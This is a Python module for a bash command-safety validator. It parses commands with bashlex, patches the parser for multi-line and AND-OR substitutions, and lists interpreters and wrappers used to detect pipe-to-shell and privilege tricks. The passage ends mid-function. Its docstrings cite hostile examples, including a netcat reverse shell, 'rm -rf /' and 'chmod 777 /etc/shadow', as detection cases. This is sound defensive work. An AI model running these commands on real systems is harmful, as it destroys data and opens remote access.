"""Bash command parser using bashlex AST analysis.

This module provides bashlex-based parsing for command safety validation.
It extracts commands from bash syntax and detects dangerous constructs.

The parser is security-critical and REQUIRES bashlex for proper AST parsing.
Regex-based parsing is explicitly NOT supported due to security risks.
"""

import copy
import logging
from typing import Any, NamedTuple, Optional

import bashlex
import bashlex.ast
import bashlex.errors
import bashlex.parser
import bashlex.subst
import bashlex.tokenizer

from schlock.exceptions import ParseError

logger = logging.getLogger(__name__)


# Each AND-OR list operator and the `simple_list1` production its `$( … )` close should reduce
# through (discovered by table-walk, never by hardcoded index). The 4-symbol AND_AND/OR_OR rules
# need an extra `newline_list` hop vs the 3-symbol AMPERSAND rule.
_ANDOR_CORRECTION_SPECS = (
    ("AMPERSAND", ("simple_list1", "AMPERSAND", "simple_list1"), False),
    ("AND_AND", ("simple_list1", "AND_AND", "newline_list", "simple_list1"), True),
    ("OR_OR", ("simple_list1", "OR_OR", "newline_list", "simple_list1"), True),
)


def _parse_succeeds(src: str) -> bool:
    """True if vendored bashlex parses ``src`` without raising (used by the correction self-check)."""
    try:
        bashlex.parse(src)
        return True
    except Exception:  # noqa: BLE001 - any failure means "did not parse", which is all we need
        return False


def _andor_correction_self_check() -> bool:
    """Previously-failing AND-OR forms must now parse AND malformed bash must still be rejected."""
    must_parse = ("echo $(a && b)", "echo $(a || b)", "echo $(a & b)")
    must_reject = ("echo $(a &&)", "echo $(&& a)", "echo $(a ||)", "echo $(a && && b)")
    if not all(_parse_succeeds(s) for s in must_parse):
        return False
    return not any(_parse_succeeds(s) for s in must_reject)


def _apply_andor_substitution_correction() -> None:
    """Teach bashlex to parse AND-OR lists (``&&``/``||``/``&``) inside ``$( … )``.

    bashlex 0.18 only accepts ``;``-separated lists inside a command substitution: an AND-OR
    operator there raises ``ParsingError``. Because schlock's safety validator is fail-closed,
    that turns legitimate commands like ``X=$(cd "$(git rev-parse --git-dir)" && pwd)`` into a
    hard block. Upstream (idank/bashlex#54) is unfixed and 0.18 is the latest release, so we
    correct the parser ourselves.

    Root cause: bashlex's own import-time hack ``get_correction_rightparen_states`` adds a
    ``RIGHT_PAREN`` reduce action only to the SEMICOLON continuation state. The sibling AMPERSAND
    / AND_AND / OR_OR continuation states have no ``RIGHT_PAREN`` action, so the closing ``)`` of
    the substitution lands on an error cell. We mirror bashlex's technique and fill those cells.

    Safety: an LALR parse never visits an error (absent) cell, so adding an action to a cell that
    is currently absent cannot change the parse of any input that already parsed — only the
    inputs that previously hit ``p_error`` are affected. We therefore patch a cell ONLY when it is
    absent, and reduce via each operator's own ``simple_list1`` production so the resulting AST
    matches a top-level ``a && b`` list.

    Degrades gracefully: if the table layout ever drifts (new bashlex / arch) and the walk derives
    a wrong cell, a self-check reverts every patched cell and logs a warning, leaving the
    fail-closed status quo (over-block) rather than risking a structurally wrong AST.
    """
    try:
        yp = bashlex.parser.yaccparser
        action, goto, productions = yp.action, yp.goto, yp.productions
        prod_index = {(p.name, tuple(p.prod)): i for i, p in enumerate(productions)}

        def continuation_state(op: str, *, via_newline_list: bool) -> Optional[int]:
            """State reached after shifting ``op`` from the initial ``simple_list1`` state."""
            shifted = action[goto[0]["simple_list1"]].get(op)
            if shifted is None or shifted < 0:  # must be a shift (positive state)
                return None
            table = goto[shifted]
            if via_newline_list:
                nl = table.get("newline_list")
                if nl is None:
                    return None
                table = goto[nl]
            return table.get("simple_list1")

        patched: list[int] = []
        missed = False
        for op, rhs, via_nl in _ANDOR_CORRECTION_SPECS:
            state = continuation_state(op, via_newline_list=via_nl)
            prod = prod_index.get(("simple_list1", rhs))
            if state is None or prod is None:
                # Could not derive this correction — the table layout may have drifted.
                missed = True
                continue
            if action[state].get("RIGHT_PAREN") is not None:
                continue  # already supported/applied — natively fine, never clobber it
            action[state]["RIGHT_PAREN"] = -prod
            patched.append(state)

        # Run the self-check whenever we changed the tables OR a spec failed to derive (drift
        # signal). Only skip it when every spec was already natively supported (nothing patched,
        # nothing missed) — there is then nothing to verify. A bare derivation miss must still
        # warn: a silent degrade to fail-closed over-block is a silent failure.
        if (patched or missed) and not _andor_correction_self_check():
            for state in patched:
                action[state].pop("RIGHT_PAREN", None)
            logger.warning(
                "bashlex AND-OR substitution correction failed self-check; reverted "
                "(legitimate $(a && b) substitutions will be conservatively blocked)"
            )
    except Exception:  # noqa: BLE001 - correction is best-effort; never break import
        logger.warning("bashlex AND-OR substitution correction could not be applied", exc_info=True)


_apply_andor_substitution_correction()


def _parse_all_substitution_units(
    parserobj: Any, base: str, sindex: int, tokenizerargs: Optional[dict[str, Any]] = None
) -> tuple[Any, int]:
    r"""Drop-in for ``bashlex.subst._recursiveparse`` that reads EVERY line of a substitution body.

    bashlex 0.18 parses the body of ``$( … )``, ``<( … )`` and `` ` … ` `` with a single call to
    its top-level ``inputunit`` production, and a bare newline ends an input unit. So for
    ``$(echo a\nrm -rf /)`` only ``echo a`` reached the AST: the tokenizer had already delimited
    the whole word, so nothing raised, and ``rm -rf /)`` was re-read as inert word text. The
    validator was handed a truncated tree and rated the command SAFE while bash ran the second
    line (LAB-4114). ``;``, ``|``, ``&&`` and ``||`` joins were never affected — they are
    intra-unit — which is why the single-line spelling was always caught.

    This parses unit after unit until the tokenizer stops at the closing ``)`` (or the end of a
    backtick body) and joins the units into the ``list`` / ``operator('\n')`` shape bashlex's
    own grammar produces for ``(a\nb)``, so the validator's list-segment path sees each line as
    a segment exactly as it does for ``$(a; b)``. A one-unit body yields the same node and end
    offset as before. Comment lines, blank lines and heredoc bodies are skipped by the tokenizer
    itself — its post-parse index is the only resume signal, never a hand-rolled scan.

    Fail closed by construction: a unit that does not parse raises exactly as it does today; a
    body with nothing to parse (stock bashlex handed back the bare ``'\n'`` string for ``` ` ` ```
    and crashed on ``.pos``), a unit ending on a token that is neither a newline nor the body's own
    closer (``)`` for ``$( )`` and ``<( )``, EOF for backticks), and a ``$( )`` or ``<( )`` body that
    runs out before its ``)`` all raise ``ParsingError``, so they take the normal deny path.
    """
    tok = parserobj.tok
    if tokenizerargs is None:
        tokenizerargs = {
            "parserstate": copy.copy(tok._parserstate),
            "lastreadtoken": tok._last_read_token,
            "tokenbeforethat": tok._token_before_that,
            "twotokensago": tok._two_tokens_ago,
        }
    limit = parserobj._expansionlimit
    if limit is not None:
        limit -= 1

    newline_type = bashlex.tokenizer.tokentype.NEWLINE
    eof_type = bashlex.tokenizer.tokentype.EOF
    # ``_parsedolparen`` passes ``)`` as ``eoftoken`` for a ``$( )`` / ``<( )`` body; the backtick branch passes none.
    closer: Any = tokenizerargs.get("eoftoken")
    body_end_type = closer.ttype if closer is not None else eof_type
    string = base[sindex:]
    parts: list[Any] = []
    offset = 0

    def body_ended(token: Any) -> bool:
        """A body ends only at its own closer. EOF inside a ``$( )`` body means the word delimiter and
        the unit tokenizer disagreed about where it ends: deny rather than rate the prefix (LAB-4114)."""
        if closer is not None and token.ttype is eof_type:
            raise bashlex.errors.ParsingError(f"unexpected EOF while looking for matching {closer.value!r}", string, len(string))
        return token.ttype is body_end_type

    while True:
        # ``_parser`` pops ``parserstate`` out of the dict it is given and the tokenizer mutates
        # the state as it runs, so every unit gets its own copy of both.
        args = dict(tokenizerargs)
        args["parserstate"] = copy.copy(tokenizerargs["parserstate"])
        unit = bashlex.parser._parser(string[offset:], tokenizerargs=args, expansionlimit=limit)
        parsed = unit.parse()
        if not isinstance(parsed, bashlex.ast.node):
            # ``None`` for an empty body, a bare str for a whitespace-only one: neither is a unit.
            raise bashlex.errors.ParsingError("empty command substitution", string, offset)
        node: Any = parsed  # bashlex is untyped; every attribute below is dynamic
        end = offset + node.pos[1]
        bashlex.subst._adjustpositions(node, sindex + offset, len(base))
        parts.extend(node.parts if node.kind == "list" else [node])

        terminator: Any = unit.tok._current_token
        if body_ended(terminator):
            # The unit ended at its ``)``. EOF never lands here: the tokenizer appends a trailing
            # newline, so a unit ends on NEWLINE or the closer, and EOF is only seen at the peek below.
            break
        if terminator.ttype is not newline_type:
            # Only a newline, ``)`` or EOF can end an ``inputunit``. Anything else means the grammar
            # moved under us; handing back the prefix would silently drop the rest of the body.
            raise bashlex.errors.ParsingError(
                f"unexpected {terminator.value!r} after substitution unit", string, offset + terminator.lexpos
            )
        # The tokenizer has consumed the terminator - and any heredoc body it opened - so its
        # index is where the next unit starts. Capture it before peeking moves it on.
        resume = unit.tok._shell_input_line_index
        # Blank and comment lines yield further NEWLINE tokens, which the parser absorbs. What
        # follows them decides: another unit, or nothing but the terminator, which bashlex's
        # ``$( )`` grammar cannot parse on a line of its own.
        following: Any = unit.tok.token()
        while following.ttype is newline_type:
            following = unit.tok.token()
        if body_ended(following):
            break
        # ``a;\nb`` already carries its separator; mirror ``p_list1`` and never emit two in a row.
        if parts[-1].kind != "operator":
            pos = (sindex + offset + terminator.lexpos, sindex + offset + terminator.endlexpos)
            parts.append(bashlex.ast.node(kind="operator", op="\n", pos=pos))
        offset += resume

    if len(parts) == 1:
        return parts[0], end
    return bashlex.ast.node(kind="list", parts=parts, pos=(parts[0].pos[0], parts[-1].pos[1])), end


# ``_parsedolparen`` (``$( )``, ``<( )``) and the backtick branch of ``_expandwordinternal`` both
# reach ``_recursiveparse`` by module-global lookup, so one rebind covers all three spellings.
# Assigning to a name bashlex no longer reads would install nothing and leave the truncating
# parse live, so a bashlex that renamed it must fail this import rather than run. What an
# import failure means for the tool call is the hook's decision, made where it imports this module.
if not hasattr(bashlex.subst, "_recursiveparse"):
    raise ImportError("bashlex.subst._recursiveparse is missing; the multi-line substitution correction cannot install")
bashlex.subst._recursiveparse = _parse_all_substitution_units

# Interpreters that EXECUTE their standard input as a program when given no program source.
# Used to detect top-level pipe-to-shell (cmd | bash). DELIBERATELY EXCLUDES xargs/env:
# those run a *named* command, not stdin-as-program, and are covered by the download->shell
# and wrapper-command checks.
# A heredoc body is inert text to `cat` and source code to `bash`, which decides
# both whether its matches are suppressed (extract_heredoc_ranges) and whether a
# segment has to carry it (extract_command_segments). One set, so the two answers
# cannot drift apart. Wrapper-blind by inheritance - see LAB-3095.
_HEREDOC_SHELL_COMMANDS = frozenset({"bash", "sh", "zsh", "ksh", "dash", "ash", "fish"})

STDIN_EXEC_INTERPRETERS = frozenset(
    {
        "bash",
        "sh",
        "zsh",
        "dash",
        "ksh",
        "ash",
        "fish",
        "python",
        "python2",
        "python3",
        "perl",
        "ruby",
        "node",
        "php",
        "php7",
        "php8",
        "lua",
        "lua5.1",
        "lua5.2",
        "lua5.3",
        "lua5.4",
        "luajit",
        "R",
        "Rscript",
        "julia",
        "tclsh",
        "wish",
        "pwsh",
        "powershell",
        "gawk",
        "mawk",
        "nawk",
    }
)

# Per-interpreter flags whose presence supplies an INLINE program (so the interpreter is NOT
# executing piped stdin). Interpreter-specific on purpose: bash -e/-m are NOT code flags
# (errexit/monitor) and must stay dangerous, whereas perl/ruby -e and python -m ARE code.
_INLINE_CODE_FLAGS = {
    "bash": frozenset({"-c"}),
    "sh": frozenset({"-c"}),
    "zsh": frozenset({"-c"}),
    "dash": frozenset({"-c"}),
    "ksh": frozenset({"-c"}),
    "ash": frozenset({"-c"}),
    "fish": frozenset({"-c"}),
    "python": frozenset({"-c", "-m"}),
    "python2": frozenset({"-c", "-m"}),
    "python3": frozenset({"-c", "-m"}),
    "perl": frozenset({"-e", "-E"}),
    "ruby": frozenset({"-e"}),
    "node": frozenset({"-e", "--eval", "-p", "--print"}),
    "php": frozenset({"-r"}),
    "lua": frozenset({"-e"}),
    "lua5.1": frozenset({"-e"}),
    "lua5.2": frozenset({"-e"}),
    "lua5.3": frozenset({"-e"}),
    "lua5.4": frozenset({"-e"}),
    "luajit": frozenset({"-e"}),
    "R": frozenset({"-e"}),
    "Rscript": frozenset({"-e"}),
    "julia": frozenset({"-e"}),
    "pwsh": frozenset({"-c", "-Command", "-EncodedCommand"}),
    "powershell": frozenset({"-c", "-Command", "-EncodedCommand"}),
    # tclsh/wish/awk family: program is a positional file/arg -> no inline-code flag needed
}


# Tokens that explicitly designate STDIN as the program source.
_STDIN_PATHS = frozenset({"-", "/dev/stdin", "/dev/fd/0", "/proc/self/fd/0"})

# Multicall binaries dispatch to an applet named by their first positional arg
# (`busybox sh`, `toybox cat`). Classify the pipeline stage by the resolved applet, not the
# wrapper, so `cat x | busybox sh` is seen as a shell sink while bare `busybox` (no applet) is not.
_MULTICALL_BINARIES = frozenset({"busybox", "toybox"})


# Wrapper commands that pass through execution to subsequent args. Best-effort, NOT an
# exhaustive enumeration - an unknown wrapper degrades to the pre-LAB-2754 behaviour.
# SECURITY: 'env exec bash' executes exec despite env being first word
# Categories for documentation and maintainability:
# - Privilege: sudo, doas, pkexec (escalate privileges)
# - Resource: nice, ionice, timeout, nohup, stdbuf, time (control resources)
# - Execution: env, command, xargs, parallel (modify execution context)
# - Multicall: busybox, toybox (can invoke any applet)
# - Namespace: chroot, nsenter, unshare (container/namespace operations)
WRAPPER_COMMANDS: frozenset[str] = frozenset(
    {
        # Privilege escalation
        "sudo",  # Run as superuser
        "doas",  # OpenBSD sudo equivalent
        "pkexec",  # PolicyKit execution
        # Resource control
        "nice",  # Adjusts CPU priority
        "ionice",  # Adjusts I/O priority
        "timeout",  # Adds time limit
        "nohup",  # Prevents hangup signals
        "stdbuf",  # Modifies buffering
        "time",  # Times execution
        "chrt",  # Real-time scheduler control
        "taskset",  # CPU affinity
        # Execution context
        "env",  # Modifies environment then executes
        "command",  # Bypasses shell functions/aliases
        "xargs",  # Executes command with piped input
        "parallel",  # GNU parallel execution
        "setsid",  # New session execution
        "flock",  # Lock file, then exec
        "strace",  # Trace, then exec
        "ltrace",  # Trace library calls, then exec
        "systemd-run",  # Run as a transient systemd unit
        "setpriv",  # Drop/alter privileges, then exec
        "unbuffer",  # expect(1) pty wrapper
        "su",  # Switch user (also carries its own -c)
        "runuser",  # su without PAM auth
        "sg",  # Run under a different group
        # Multicall binaries
        "busybox",  # Multi-tool binary (can run any applet)
        "toybox",  # Lightweight busybox alternative
        # Namespace/container operations (CRITICAL - escape vectors)
        "chroot",  # Change root filesystem
        "nsenter",  # Enter namespaces
        "unshare",  # Create namespaces
        "setarch",  # Architecture override
        "linux32",  # 32-bit mode
        "linux64",  # 64-bit mode
    }
)


def _resolve_multicall(cmd_name: str, args: list[str]) -> tuple[str, list[str]]:
    """Resolve a multicall binary to its effective applet and that applet's args.

    `busybox sh -c x` -> ('sh', ['-c', 'x']); `busybox ls` -> ('ls', []); bare `busybox` or
    `busybox --help` (no applet) -> unchanged. Non-multicall commands pass through untouched.
    """
    if cmd_name not in _MULTICALL_BINARIES:
        return cmd_name, args
    for i, arg in enumerate(args):
        if not arg.startswith("-"):
            return arg, args[i + 1 :]
    return cmd_name, args


def _first_command_node(node: Any) -> Optional[Any]:
    """Return the first `command`-kind node reachable from `node`, in source order, else None.

    Used to classify a subshell/group pipeline stage (`(bash)`, `{ bash; }`): the piped data lands
    on the FIRST command inside the group (its stdin sink). Inner *pipelines* within the group are
    handled separately by the recursive walk, so first-command is the right target here. See #97.
    """
    if not hasattr(node, "kind"):
        return None
    if node.kind == "command":
        return node
    for attr in ("list", "parts", "command"):
        child = getattr(node, attr, None)
        if isinstance(child, list):
            for item in child:
                found = _first_command_node(item)
                if found is not None:
                    return found
        elif child is not None:
            found = _first_command_node(child)
            if found is not None:
                return found
    return None


def _reads_stdin_as_program(cmd_name: str, args: list[str]) -> bool:
    """True if interpreter `cmd_name` would execute its STDIN as a program given `args`.

    Fail-CLOSED model (a security check must not guess flag arity): the interpreter is exempt
    (returns False) only when a program source is UNAMBIGUOUS —
      - an inline-code flag valid for this interpreter (-c / -e / -m / ...), separate or attached; or
      - a positional (non-dash) script token appearing BEFORE any option flag.
    Once an option flag is seen, a following non-dash token is treated as that flag's VALUE
    (NOT a script), so it cannot exempt — this closes the value-taking-flag bypass
    (`bash --rcfile X`, `python3 -W ignore`, `perl -I /tmp`, `node -r fs`, ...).
    Explicit stdin paths ('-', '/dev/stdin', ...) -> True. No unambiguous program -> True.
    """
    inline = _INLINE_CODE_FLAGS.get(cmd_name, frozenset())
    saw_option = False
    for arg in args:
        # Inline code (separate flag, or attached like -c'...') -> runs that program, not stdin.
        if arg in inline or (len(arg) > 2 and arg[0] == "-" and f"-{arg[1]}" in inline):
            return False
        # Explicit stdin designator -> reads stdin.
        if arg in _STDIN_PATHS:
            return True
        if not arg.startswith("-"):
            # A leading positional (before any option) is a script file -> runs it.
            # A non-dash token AFTER an option is that option's value, NOT a script -> ignore it.
            if not saw_option:
                return False
            continue
        saw_option = True
    return True


class CommandSegment(NamedTuple):
    """One independently-validated command segment, wholly derived from ONE parse.

    The two range lists have DIFFERENT shapes - `(start, stop)` for literals,
    `(start, stop, is_shell)` for heredocs - and both feed suppression. Naming
    them is what stops one being passed where the other belongs, which would
    misalign suppression silently rather than raise.
    """

    text: str
    string_literals: list[tuple[int, int]]
    heredoc_ranges: list[tuple[int, int, bool]]
    # The segment's own node in the PARENT AST. Its word spans index the whole
    # command, not `text` - see validator._match_original_and_reconstructed's
    # `quote_source`, which is the reason this is handed back at all.
    node: Any


class BashCommandParser:
    """Parse bash commands using bashlex AST analysis.

    This parser is security-critical. It uses bashlex to parse commands into
    an Abstract Syntax Tree (AST), enabling accurate detection of dangerous
    patterns that regex cannot reliably catch.

    SECURITY: This class REQUIRES bashlex. It will not fall back to regex
    parsing, as regex-based command parsing has well-known bypass vulnerabilities.

    Example:
        >>> parser = BashCommandParser()
        >>> ast = parser.parse("git log | grep 'pattern'")
        >>> commands = parser.extract_commands(ast)
        >>> print(commands)  # ['git', 'grep']
    """

    def __init__(self):
        """Initialize BashCommandParser."""
        pass

    def _get_command_name(self, node) -> Optional[str]:
        """Extract the command name from a command node.

        SECURITY: Correctly handles prefixes that appear before the command:
        - Assignment nodes: VAR=value exec bash → returns 'exec'
        - Redirect nodes: 2>&1 exec bash → returns 'exec'
        - Path handling: /usr/bin/exec → returns 'exec'

        Args:
            node: A bashlex AST node

        Returns:
            The command name (basename), or None if not a command node

        Example:
            >>> # VAR=x exec bash → 'exec' (assignment skipped)
            >>> # /usr/bin/curl → 'curl' (path stripped)
        """
        if not hasattr(node, "kind") or node.kind != "command":
            return None
        if not hasattr(node, "parts"):
            return None

        for part in node.parts:
            # Skip assignment nodes (VAR=value prefixes)
            if hasattr(part, "kind") and part.kind == "assignment":
                continue
            # Skip redirects
            if hasattr(part, "kind") and part.kind == "redirect":
                continue
            # Found a word node - this is the command name
            if hasattr(part, "word"):
                cmd = part.word.split("/")[-1]
                return cmd if cmd else None

        return None

    def parse(self, command: str) -> list[Any]:
        """Parse command into bashlex AST.

        Args:
            command: Bash command string to parse

        Returns:
            List of bashlex AST nodes

        Raises:
            ValueError: If command is empty or whitespace-only
            ParseError: If bashlex fails to parse the command syntax

        Example:
            >>> parser = BashCommandParser()
            >>> ast = parser.parse("echo hello")
            >>> ast  # [<bashlex.ast.node object>]
        """
        # Input validation
        if not command:
            raise ValueError("Command cannot be empty")
        if not command.strip():
            raise ValueError("Command cannot be whitespace-only")

        try:
            return bashlex.parse(command)
        except bashlex.errors.ParsingError as e:
            # Preserve original bashlex error for debugging
            raise ParseError(
                f"Failed to parse bash command: {command!r}",
                original_error=e,
            )
        except Exception as e:
            # Catch any other unexpected bashlex errors
            logger.error(f"Unexpected error parsing command: {e}")
            raise ParseError(
                f"Unexpected parsing error for command: {command!r}",
                original_error=e,
            )

    def extract_commands(self, ast_nodes: list[Any]) -> list[str]:
        """Extract all command names from AST.

        Traverses the AST and extracts the first word of each command node,
        which is typically the command name (e.g., 'git', 'rm', 'curl').

        Args:
            ast_nodes: List of bashlex AST nodes from parse()

        Returns:
            List of command names extracted from the AST

        Example:
            >>> parser = BashCommandParser()
            >>> ast = parser.parse("git log | grep pattern")
            >>> parser.extract_commands(ast)
            ['git', 'grep']
        """
        commands = []

        def visit(node):
            """Recursively visit AST nodes to extract commands."""
            if hasattr(node, "kind"):
                # Command nodes contain the actual command
                if node.kind == "command" and hasattr(node, "parts") and node.parts:
                    # First part is typically the command name
                    for part in node.parts:
                        if hasattr(part, "word"):
                            commands.append(part.word)
                            break  # Only take first word (command name)

                # Recursively visit child nodes
                for attr in ["parts", "command", "list", "pipe", "compound"]:
                    if hasattr(node, attr):
                        child = getattr(node, attr)
                        if isinstance(child, list):
                            for item in child:
                                visit(item)
                        elif child:
                            visit(child)

        for node in ast_nodes or []:
            visit(node)

        return commands

    def extract_commands_with_args(self, ast_nodes: list[Any]) -> list[tuple[str, list[str]]]:
        """Extract all command names with their arguments from AST.

        SECURITY CRITICAL: Returns command name and ALL arguments as extracted
        by bashlex AST (quotes stripped). This enables pure AST-based validation
        of dangerous flag combinations without regex pattern matching.

        Args:
            ast_nodes: List of bashlex AST nodes from parse()

        Returns:
            List of (command_name, [args]) tuples where args includes all
            arguments with quotes stripped by bashlex.

        Example:
            >>> parser = BashCommandParser()
            >>> ast = parser.parse('"nc" -e /bin/bash host 4444')
            >>> parser.extract_commands_with_args(ast)
            [('nc', ['-e', '/bin/bash', 'host', '4444'])]
        """
        results: list[tuple[str, list[str]]] = []

        def visit(node):
            """Recursively visit AST nodes to extract commands with args."""
            if hasattr(node, "kind"):
                # Command nodes contain the actual command and arguments
                if node.kind == "command" and hasattr(node, "parts") and node.parts:
                    words = []
                    for part in node.parts:
                        # Skip assignment nodes (VAR=value prefixes)
                        if hasattr(part, "kind") and part.kind == "assignment":
                            continue
                        # Skip redirects (2>&1, >, <, etc.)
                        if hasattr(part, "kind") and part.kind == "redirect":
                            continue
                        if hasattr(part, "word"):
                            words.append(part.word)
                    if words:
                        # First word is command, rest are arguments
                        results.append((words[0], words[1:]))

                # Recursively visit child nodes
                for attr in ["parts", "command", "list", "pipe", "compound"]:
                    if hasattr(node, attr):
                        child = getattr(node, attr)
                        if isinstance(child, list):
                            for item in child:
                                visit(item)
                        elif child:
                            visit(child)

        for node in ast_nodes or []:
            visit(node)

        return results

    @staticmethod
    def _close_heredocs(segment: str, node: Any) -> str:
        """Re-attach this command's heredocs so the segment parses on its own.

        bashlex hangs a heredoc body off the redirect node, PAST the command's
        span, so the bare slice ends at a `<<EOF` whose body never arrives. It
        then fails to re-parse, and a segment with no AST loses both literal
        suppression and the quote-stripped pass - which is how
        `echo hi && "chmod" 777 /etc/shadow <<EOF` scored SAFE.

        Only a shell's body comes back with it. `cat`'s body is inert text that
        the rule patterns would scan for nothing, and they backtrack over it:
        an everyday `cat <<EOF > file` with a 1000-line body cost seconds on a
        hook that runs before every bash call. `bash`'s body is source code,
        and dropping it would let `bash <<EOF | tee log` hide an `rm -rf /`.

        The terminator is always bashlex's own delimiter word, stripped exactly
        as the slice was, so a CRLF opener cannot desync from its terminator and
        fail closed on a legitimate command.
        """
        cmd_name = next((part.word.split("/")[-1] for part in node.parts if hasattr(part, "word")), None)
        executes_body = cmd_name in _HEREDOC_SHELL_COMMANDS

        for part in node.parts:
            heredoc = getattr(part, "heredoc", None)
            if heredoc is None:
                continue
            # bashlex's value is the body followed by its terminator line.
            body, _, _ = heredoc.value.rpartition("\n")
            segment += f"\n{body if executes_body else ''}\n{part.output.word.strip()}"

        return segment

    def _segment_nodes(self, ast_nodes: list[Any]) -> list[Any]:
        """Collect the AST nodes that each form one independently-validated segment."""
        nodes: list[Any] = []

        def visit(node):  # noqa: PLR0912 - AST traversal requires multiple branches
            """Recursively visit AST nodes to collect command nodes."""
            if hasattr(node, "kind"):
                # Command nodes contain individual commands
                if node.kind == "command" and hasattr(node, "pos"):
                    nodes.append(node)
                    return  # Don't recurse into command parts

                # Pipeline nodes - visit each command in the pipeline
                if node.kind == "pipeline" and hasattr(node, "parts"):
                    for part in node.parts:
                        if hasattr(part, "kind") and part.kind != "pipe":
                            visit(part)
                    return

                # List nodes (;, &&, ||) - visit each command
                if node.kind == "list" and hasattr(node, "parts"):
                    for part in node.parts:
                        if hasattr(part, "kind") and part.kind not in ("operator",):
                            visit(part)
                    return

                # Compound commands (if, for, while, etc.) - recurse into body
                if node.kind == "compound" and hasattr(node, "list"):
                    for item in node.list if isinstance(node.list, list) else [node.list]:
                        visit(item)
                    return

                # Recursively visit other child nodes
                for attr in ["parts", "command", "list", "pipe", "compound"]:
                    if hasattr(node, attr):
                        child = getattr(node, attr)
                        if isinstance(child, list):
                            for item in child:
                                visit(item)
                        elif child:
                            visit(child)

        for node in ast_nodes or []:
            visit(node)

        return nodes

    @staticmethod
    def _rebase(ranges: list[tuple], base: int, end: int) -> list[tuple]:
        """Move offsets from the whole command onto one segment, dropping any outside it.

        Containment is not a formality, and it does different work per caller.

        For string literals it is a guard: a literal outside the span has no
        segment-relative expression, and dropping one costs only a false-positive
        suppression, never a missed match.

        For heredoc ranges it is the LIVE case, and both outcomes are load-bearing.
        A heredoc nested in a substitution (`diff <(cat <<EOF ... EOF)`) sits INLINE
        in the slice - _close_heredocs only ever reaches a command's own redirects,
        so nothing else suppresses it, and `cat` merely emits that text. It is
        inside the span, so it rebases and keeps suppressing. The segment's OWN
        body sits PAST the span; _close_heredocs re-appends it at an offset this
        slice cannot describe, so it is dropped - correct twice over, because the
        only body it ever appends is a shell's, and a shell's body is code that
        must stay matchable.
        """
        return [(start - base, stop - base, *rest) for start, stop, *rest in ranges if start >= base and stop <= end]

    def _locate_segment(self, command: str, node: Any) -> Optional[tuple[str, int]]:
        """Return (segment text, its start offset in `command`), or None if unusable.

        The offset is where the STRIPPED text begins, which is what makes
        segment-relative positions derivable without re-parsing the segment.
        """
        start, end = node.pos
        if start >= len(command) or end > len(command):
            # Dropping a segment means nothing validates it, which is the
            # fail-OPEN direction - so it must not happen silently.
            logger.warning("Segment span (%d, %d) outside command of length %d; segment not validated", start, end, len(command))
            return None
        raw = command[start:end]
        text = raw.strip()
        # An escaped trailing blank (`echo hi \ ; ls`) is a one-blank argument
        # and the strip just ate it. Callers re-parse the segment, and a
        # dangling `echo hi \` parses nowhere: the main loop loses its quote
        # context, the heredoc fallback denies it outright. Give it back — a
        # space either way, since `\<tab>` is the same one-blank argument and
        # the lengths match. An even run of backslashes is a literal argument
        # and needs nothing.
        # Done here, the one place the slice is taken, so every caller of
        # extract_command_segments{,_with_literals} gets it. Sound only because
        # `node.pos` already spans the blank: that is what keeps `base +
        # len(text)` on the node end, which extract_command_segments_with_literals
        # uses to bound its rebased literal ranges. Restoring a character the
        # span does NOT cover would widen that bound and keep a suppression
        # range it should have dropped.
        if (len(text) - len(text.rstrip("\\"))) % 2:
            text += " "
        if not text:
            logger.warning("Segment span (%d, %d) is blank after stripping; segment not validated", start, end)
            return None
        return text, start + (len(raw) - len(raw.lstrip()))

    def extract_command_segments(self, command: str, ast_nodes: list[Any]) -> list[str]:
        """Extract full command segments from pipelines and command lists.

        SECURITY CRITICAL: Returns the full text of each command segment so
        each can be validated independently. Prevents bypass via piping/chaining
        dangerous commands after whitelisted ones.

        Args:
            command: Original command string
            ast_nodes: List of bashlex AST nodes from parse()

        Returns:
            List of command segment strings extracted from the AST

        Example:
            >>> parser = BashCommandParser()
            >>> ast = parser.parse("ls | rm -rf / && echo done")
            >>> parser.extract_command_segments("ls | rm -rf / && echo done", ast)
            ['ls', 'rm -rf /', 'echo done']
        """
        return [segment.text for segment in self.extract_command_segments_with_literals(command, ast_nodes)]

    def extract_command_segments_with_literals(self, command: str, ast_nodes: list[Any]) -> list[CommandSegment]:
        """Segments, their quoted-string ranges, and their own AST node — from ONE parse.

        PERF/SECURITY: the segment loop in `validate_command` used to re-parse
        every segment — for its string-literal ranges, and since LAB-1732 for the
        quote-stripped reconstructed pass too. That is N+1 parses per command,
        which under the native tier (spec §3.2) is N+1 subprocess spawns on a hook
        that runs before every bash call. A segment is a slice of `command`, so its
        words already sit in the parent AST: rebase the offsets, and hand the
        segment's own node back so the reconstructed pass can read that segment's
        quoting straight out of `command` (see
        validator._match_original_and_reconstructed). Deriving rather than
        re-parsing also removes the failure mode the re-parse had to fail closed
        on — a segment that would not parse standalone no longer exists.

        Args:
            command: Original command string
            ast_nodes: List of AST nodes from parse() of the WHOLE command

        Returns:
            List of CommandSegment - text, its string-literal ranges, its heredoc
            ranges, and its node - every field relative to `text` except the node.
            Both range lists go through _rebase, which is where the rule for what
            a segment may and may not suppress lives. `text` carries its heredoc
            back (_close_heredocs); that blob is appended AFTER the ranges are
            rebased, at the end of the text, so it cannot shift them.
        """
        results: list[CommandSegment] = []
        for node in self._segment_nodes(ast_nodes):
            located = self._locate_segment(command, node)
            if located is None:
                continue
            text, base = located
            end = base + len(text)
            results.append(
                CommandSegment(
                    text=self._close_heredocs(text, node),
                    string_literals=self._rebase(self.extract_string_literals(command, [node]), base, end),
                    heredoc_ranges=self._rebase(self.extract_heredoc_ranges(command, [node]), base, end),
                    node=node,
                )
            )
        return results

    def _collect_words(self, ast_nodes: list[Any]) -> list[tuple[str, Optional[tuple]]]:
        """Collect the word parts that make up the reconstructed command.

        Returns:
            List of (word_text, original_span) tuples in reconstruction order.
            original_span is the node's (start, end) offsets in the source
            command, or None when the node carries no position.
        """
        words: list[tuple[str, Optional[tuple]]] = []

        def visit(node):
            """Recursively visit AST nodes to extract words."""
            if hasattr(node, "kind"):
                # Command nodes - extract their word parts
                if node.kind == "command" and hasattr(node, "parts"):
                    for part in node.parts:
                        if hasattr(part, "word"):
                            words.append((part.word, getattr(part, "pos", None)))
                    return  # Don't recurse further into this command

                # Recursively visit child nodes for other structures
                for attr in ["parts", "command", "list", "pipe", "compound"]:
                    if hasattr(node, attr):
                        child = getattr(node, attr)
                        if isinstance(child, list):
                            for item in child:
                                visit(item)
                        elif child:
                            visit(child)

        for node in ast_nodes or []:
            visit(node)

        return words

    def reconstruct_command(self, ast_nodes: list[Any]) -> str:
